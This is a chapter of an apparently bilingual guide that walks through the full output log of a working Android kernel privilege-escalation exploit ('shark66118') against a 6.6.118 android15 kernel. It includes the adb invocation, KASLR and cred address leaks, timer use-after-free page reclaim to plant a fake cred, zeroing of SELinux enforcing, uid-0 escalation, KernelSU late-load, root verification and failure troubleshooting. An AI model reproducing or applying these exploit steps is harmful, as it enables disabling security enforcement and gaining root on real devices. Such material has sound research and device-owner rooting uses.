# 10 · The Successful Chain, Stage by Stage

[中文](../10-breakthrough.md) · **English**

> This chapter explains the winning log line by line, so you know what each step does and why
> it is needed.

---

## 1. The complete log

```console
$ adb shell "cd /data/local/tmp && \
    PYB110_KSUD=/data/local/tmp/ksud33 \
    PYB110_MANAGER_PKG=me.weishu.kernelsu \
    PYB110_KMI=android15-6.6 \
    ./shark66118 --auto"
```

```
PROBE_KERNEL=6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
PROFILE_66118=6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
PROBE_TRACE=yes
PROBE_OK
[+] pid=18271 cpu=2
[ids] page_alloc=275 page_free=273 pairs=1029 votes=1026
[calib] timers=512 low_adj=0x80000
[base] made=512 timers=512 pages=15 best=0xffffff7fc0000000 count=202
[cred] attempt=0 child=18272 R=0xffffff80c117ad80 site_low=0x164064 recs=1 task=0xffffff804d6e4b00 task_recs=1
[+] child=18272 cred=0xffffff80c117ad80 target=0xffffff80c117ad88
[+] stage fake_cred target=0xffffff804d6e5320 mode=fake attempt=1
[+] plant1 base=0xffffff7fc0000000 slabs=67 pfns=66 recs=2048 kept=2048
[+] plant1 fake cred off=0x288 blob=0x1f00 sec=0xffffff801a49df00
[slab] pre-exec active=4681 total=4681
[+] plant1 V=0xffffff801a49c210 A=0xffffff801a49c288 pfn=0x5a49c slab=0x5a49c slide=0x2b45280000 recs=2048 slab_own=31/32 base=0xffffff7fc0000000
[+] plant1 target=18273 etid=18282 zombie code=2 status=9
[dbg] plant1 spray round=1 at free (no churn)
[+] plant1 free_seen=1 burst hit=1 after 48ms
[+] plant1 reaped status=0x9
[+] plant1 write mode=fake target=0xffffff804d6e5320
[+] fake cred A=0xffffff801a49c288 selinux_state=0xffffffebc75ea2e0
[+] stage selinux target=0xffffffebc75ea2d9 mode=zero attempt=1
[+] plant1 base=0xffffff7fc0000000 slabs=67 pfns=59 recs=2048 kept=2048
[slab] pre-exec active=4681 total=4681
[+] plant1 V=0xffffff80de1d8840 A=0xffffff80de1d88b8 pfn=0x11e1d8 slab=0x11e1d8 slide=0x2b45280000 recs=2048 slab_own=31/32 base=0xffffff7fc0000000
[+] plant1 target=18305 etid=18310 zombie code=2 status=9
[dbg] plant1 spray round=1 at free (no churn)
[+] plant1 free_seen=1 burst hit=1 after 132ms
[+] plant1 reaped status=0x9
[+] plant1 write mode=zero target=0xffffffebc75ea2d9
[ksu] panic_on_warn=0
[+] stage fake_uid target=0xffffff801a49c290 mode=zero attempt=1
[+] plant1 base=0xffffff7fc0000000 slabs=67 pfns=59 recs=2048 kept=2048
[slab] pre-exec active=7254 total=7254
[+] plant1 V=0xffffff8126db8738 A=0xffffff8126db87b0 pfn=0x166db8 slab=0x166db8 slide=0x2b45280000 recs=2048 slab_own=31/32 base=0xffffff7fc0000000
[+] plant1 target=18326 etid=18333 zombie code=2 status=9
[dbg] plant1 spray round=1 at free (no churn)
[+] plant1 free_seen=1 burst hit=1 after 103ms
[+] plant1 reaped status=0x9
[+] plant1 write mode=zero target=0xffffff801a49c290
[+] cred writes landed, waking child
[child] woke uid=0 euid=0
[+] child report stage=2 uid=0 euid=0 setuid(0)=0 errno=0 resuid=0/0/0 wake=1/0
[fake] child uid=0 euid=0; one-shot late-load then park
PLANT_CRED_OK child=19711
PARKED=1
[!] fake cred page held; child parked after late-load -- parking without reap (zombie held)
LATE_LOAD_CMD='/data/local/tmp/ksud33' late-load --kmi android15-6.6 --allow-shell --package-name me.weishu.kernelsu 2>&1; echo LATE_LOAD_RC=$?
LATE_LOAD_RC=0
LATE_LOAD_SHELL_RC=0
```

---

## 2. Line-by-line

### 2.1 Self-check phase

```
PROBE_KERNEL=6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
PROFILE_66118=6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
PROBE_TRACE=yes
PROBE_OK
```

- **Exact version match**: only a character-identical kernel string selects the profile
- **`PROBE_TRACE=yes`**: tracefs is readable
- **`PROBE_OK`**: all three checks passed (timer events / slide / linear map)

**If this fails, do not bother trying the rest.**

### 2.2 Event ID discovery

```
[+] pid=18271 cpu=2
[ids] page_alloc=275 page_free=273 pairs=1029 votes=1026
```

The `events/*/id` files are 0640 (root-only metadata), so they **cannot be read directly**.
Shark's approach: allocate and free a batch of anonymous pages, then **pair alloc and free
events by pfn** in the raw records to infer the event IDs.

- `pairs=1029`: 1029 (alloc, free) pairs found
- `votes=1026`: confirmed event-ID combinations

**This is a clever self-discovery mechanism — it relies on no hardcoded IDs at all.**

### 2.3 KASLR and the linear map

```
[calib] timers=512 low_adj=0x80000
[base] made=512 timers=512 pages=15 best=0xffffff7fc0000000 count=202
```

- **`timers=512`**: 512 timer allocations successfully captured from the trace
- **`low_adj=0x80000`**: ★ our fix working — the slide's mod-2MiB component identified
- **`best=0xffffff7fc0000000`**: linear-map base (`page_offset`), `count=202` votes

**Note: `best` is not the standard `0xffffff7f80000000`. This SoC's DRAM start PFN differs.**

### 2.4 Leaking cred and task

```
[cred] attempt=0 child=18272 R=0xffffff80c117ad80 site_low=0x164064 recs=1 task=0xffffff804d6e4b00 task_recs=1
[+] child=18272 cred=0xffffff80c117ad80 target=0xffffff80c117ad88
```

- **`R=0xffffff80c117ad80`**: the child's real cred kernel address
- **`site_low=0x164064`**: runtime low-21 of `prepare_creds+0x24` (should be `0xe4064` + `0x80000`)
- **`task=0xffffff804d6e4b00`**: the child's real task_struct address
- **`target=cred+8`**: the `uid`/`gid` fields

**⚠️ Before the fix this would be `task=0 task_recs=0`.**

### 2.5 Stage 1: fake_cred

```
[+] stage fake_cred target=0xffffff804d6e5320 mode=fake attempt=1
```

**`target = task + 0x820`** — the `task_struct.cred` field.

```
[+] plant1 fake cred off=0x288 blob=0x1f00 sec=0xffffff801a49df00
```

- `off=0x288`: offset of the fake cred inside the page
- `blob=0x1f00`: SELinux blob size
- `sec=...`: address of the SELinux blob

```
[+] plant1 V=0xffffff801a49c210 A=0xffffff801a49c288 pfn=0x5a49c slab=0x5a49c ...
```

- `V`: address of the victim k_itimer
- `A`: node address (V + 0x78)
- `pfn/slab`: corresponding physical page numbers

```
[+] plant1 free_seen=1 burst hit=1 after 48ms      <- EXACT HIT
[+] plant1 reaped status=0x9                        <- only now do we reap
[+] plant1 write mode=fake target=0xffffff804d6e5320
```

**Key point: reaping happens only after `burst hit=1`. That is the difference from a blind reap.**

### 2.6 Stage 2: selinux

```
[+] fake cred A=0xffffff801a49c288 selinux_state=0xffffffebc75ea2e0
[+] stage selinux target=0xffffffebc75ea2d9 mode=zero attempt=1
```

**The runtime address of `selinux_state` = link address `0x8236a2e0` + slide.**

Note `target = selinux_state - 7` — because `enforcing` inside `selinux_state` is a bitfield,
the write must target the exact byte/bit offset.

```
[+] plant1 free_seen=1 burst hit=1 after 132ms
[+] plant1 reaped status=0x9
[+] plant1 write mode=zero target=0xffffffebc75ea2d9
```

**At this moment `getenforce` becomes Permissive (verified live).**

### 2.7 Stage 3: fake_uid

```
[ksu] panic_on_warn=0                                    <- disable panic_on_warn, reduces crash risk
[+] stage fake_uid target=0xffffff801a49c290 mode=zero attempt=1
```

**`target = fake cred + 0x08` = `uid`/`gid`** (fake cred at `A=0x288`, +8 = `0x290`).

```
[+] plant1 free_seen=1 burst hit=1 after 103ms
[+] plant1 reaped status=0x9
[+] plant1 write mode=zero target=0xffffff801a49c290
[+] cred writes landed, waking child
[child] woke uid=0 euid=0
[+] child report stage=2 uid=0 euid=0 setuid(0)=0 errno=0 resuid=0/0/0 wake=1/0
```

**`resuid=0/0/0` — real / effective / saved are all 0.**

Compare with the default mode (which only yields an empty capability set):

```
[child] woke uid=0 euid=2000          <- default mode
resuid=0/0/2000

[child] woke uid=0 euid=0             <- fake mode ★
resuid=0/0/0
```

### 2.8 late-load

```
[fake] child uid=0 euid=0; one-shot late-load then park
PLANT_CRED_OK child=19711
PARKED=1
[!] fake cred page held; child parked after late-load -- parking without reap (zombie held)
LATE_LOAD_CMD='/data/local/tmp/ksud33' late-load --kmi android15-6.6 --allow-shell --package-name me.weishu.kernelsu
LATE_LOAD_RC=0
LATE_LOAD_SHELL_RC=0
```

- **The child execs `ksud late-load`** → loads the KernelSU kernel module
- **`--allow-shell`**: allow adb shell to use `su`
- **`--kmi android15-6.6`**: target kernel module interface
- **Parent `PARKED=1`**: keeps the fake-cred page from being freed

**`PARKED` is necessary — if the parent exited, that page would be freed while a task still
points into it, which would eventually crash.**

### 2.9 Verification

```console
$ adb shell grep kernelsu /proc/modules
kernelsu 180224 4 - Live 0x0000000000000000 (O)

$ adb shell su -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0

$ adb shell su -c 'grep Cap /proc/self/status'
CapPrm: 000001ffffffffff
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
```

---

## 3. Reading a failure log

### 3.1 Stuck at calibration

```
[calib] timers=0
[base] made=512 timers=0 pages=15 best=0 count=0
[-] base calibration failed
```

**⇒ KASLR low-21-bit problem (chapter 09). Check whether `low_adj` is being detected.**

### 3.2 Stuck at cred/task leak

```
[cred] ... recs=1 task=0 task_recs=0 failed
[-] cred leak failed
```

**⇒ same low-21-bit problem, or task allocation events are not being captured.**

### 3.3 Stuck at a page reclaim stage

```
[+] plant1 free_seen=1 burst hit=0 after 3093ms
[-] plant1 burst missed; holding zombie
[-] stage fake_uid failed
FAIL=fake-uid REASON=fake-uid T=14487ms
FAIL_EXIT=fake-uid holder=t61269-hold zombies=1
[!] failed plant zombies held -- parking without reap (zombie held)
```

**⇒ pure probability. `holding zombie` is safe behaviour; simply re-run.**

### 3.4 Stuck at late-load

```
LATE_LOAD_SKIP=env-missing ksud=(null) pkg=me.weishu.kernelsu
```

**⇒ `PYB110_KSUD` was not set.**

```
LATE_LOAD_RC != 0
```

**⇒ ksud version mismatch / module load failure. Check the KernelSU manager version.**

---

## 4. Independence of the three stages

**Important: the three stages are three independent plant operations, each of which must
individually achieve `burst hit=1`.**

```
fake_cred  needs one hit
selinux    needs one hit
fake_uid   needs one hit
```

**So overall success ≈ (single-attempt success)³.**

If a single attempt is 95%, overall is 86%.
If a single attempt is 90%, overall is 73%.

**We measured roughly 2/3 on the first run — consistent with that estimate.**

**⇒ failure is normal; just re-run.**
